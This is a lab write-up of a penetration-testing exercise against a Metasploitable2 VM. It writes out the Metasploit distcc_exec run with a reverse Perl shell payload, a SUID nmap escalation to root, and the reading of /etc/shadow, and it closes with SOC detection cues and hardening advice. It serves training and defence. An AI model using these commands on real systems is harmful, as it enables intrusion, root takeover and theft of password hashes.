# Exercise 05 — distcc RCE + Privilege Escalation via SUID Nmap

**Date:** 07/03/2026
**Category:** Exploitation / Privilege Escalation
**CVE:** CVE-2004-2687
**Tools:** Metasploit Framework v6.4.99
**Attacker:** Kali Linux — 192.168.56.102
**Target:** Metasploitable2 — 192.168.56.103

---

## Objective
Exploit a misconfigured distributed compiler service to gain remote 
code execution, then escalate privileges from a low-privilege shell 
to full root access using a SUID binary misconfiguration.

---

## Part A — Remote Code Execution via distcc

### Background
distcc is a tool that distributes software compilation tasks across 
multiple machines to speed up build times — commonly found in 
developer environments and build servers. distcc contains a 
vulnerability where it executes arbitrary commands sent by a remote 
client with no authentication. Combined with a misconfiguration of 
`--allow 0.0.0.0/0` (visible in ps aux — accepting connections from 
any IP), this gives any attacker on the network the ability to run 
commands on the machine. This represents one of the most common 
real-world attack vectors: developer tooling left running in 
production with no access controls.

### Commands Run
```bash
use exploit/unix/misc/distcc_exec
set RHOSTS 192.168.56.103
set LHOST 192.168.56.102
set PAYLOAD cmd/unix/reverse_perl
run
```

### Results
```
[*] Started reverse TCP handler on 192.168.56.102:4444
[*] Command shell session 1 opened
    (192.168.56.102:4444 -> 192.168.56.103:45604)
```

### Post-Exploitation Findings
- `whoami` → `daemon` — low privilege service account, not root
- `id` → `uid=1(daemon) gid=1(daemon) groups=1(daemon)`
- `uname -a` → Linux kernel 2.6.24 from April 2008 — unpatched
- `ps aux` → own reverse shell visible as Perl one-liner with 
outbound IP `192.168.56.102:4444` — forensic artifact confirming 
attack visibility

### Key Difference — Low Privilege Shell
Unlike vsftpd and Samba exploits which returned immediate root 
access, distcc runs as the `daemon` service account. This is a 
**low-privilege shell** — the attacker has code execution but 
cannot read protected files or install persistent backdoors without 
further steps. This leads directly to Part B — privilege escalation.

---

## Part B — Privilege Escalation via SUID Nmap

### Background
SUID (Set User ID) binaries are executables that run with the 
permissions of their owner rather than the user executing them. 
When a SUID binary is owned by root, it runs as root regardless 
of who launches it. Nmap version 4.53 has a built-in interactive 
mode that allows shell command execution — since nmap is SUID root 
on this machine, those commands execute as root.

### Commands Run
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
find / -perm -4000 -type f 2>/dev/null
nmap --interactive
!sh
whoami
id
cat /etc/shadow
```

### Results
- SUID binary search returned 25 candidates including `/usr/bin/nmap`
- `nmap --interactive` → `!sh` → root shell obtained
- `whoami` → `root`
- `id` → `uid=1(daemon) gid=1(daemon) euid=0(root)` — effective 
root confirmed
- `cat /etc/shadow` → full password hash file retrieved for all 
30+ system accounts

### Full Attack Chain
```
nmap scan → distcc exploit → daemon shell → SUID nmap → root → /etc/shadow
```

---

## Real-World Relevance
Developer tools like distcc, Jenkins, and build servers are 
frequently misconfigured and left accessible on internal networks. 
The `--allow 0.0.0.0/0` flag means this distcc instance accepts 
connections from any IP with zero authentication. SUID 
misconfigurations are among the most common privilege escalation 
vectors found in real penetration tests.

The `/etc/shadow` exposure means every password hash on the system 
is now available for offline cracking. Once cracked, credentials 
enable lateral movement across the entire network.

---

## How a SOC Analyst Would Detect This

**distcc exploitation:**
- Perl process on a server with outbound connection to internal IP
- Unusual outbound TCP on port 4444 from a build server
- SIEM alert on reverse shell pattern

**Privilege escalation:**
- nmap process spawned by `daemon` user — highly anomalous
- Shell process (`sh`) spawned as child of nmap — unusual 
parent-child relationship visible in EDR telemetry
- Access to `/etc/shadow` by daemon UID — auditd would log this 
as critical
- Full kill chain detectable at multiple stages in a SIEM

---

## Recommendation
Remove distcc from any server not actively used for distributed 
builds. If required, restrict with `--allow` to specific trusted 
IPs only. Audit all SUID binaries regularly and remove the SUID 
bit from any binary that does not require it. Implement file 
integrity monitoring on `/etc/shadow`. Deploy auditd rules to 
log SUID binary execution.

---

## Screenshots

### Part A — distcc Exploit — Low Privilege Shell Obtained
![distcc exploit](screenshots/05a-distcc-exploit.png)

### Part A — ps aux — Reverse Shell Visible as Process
![ps aux output](screenshots/05a-distcc-psaux.png)

### Part B — SUID Search and nmap Escalation to Root
![SUID escalation](screenshots/05b-suid-escalation.png)

### Part B — /etc/shadow Retrieved After Escalation
![shadow file](screenshots/05b-shadow-file.png)
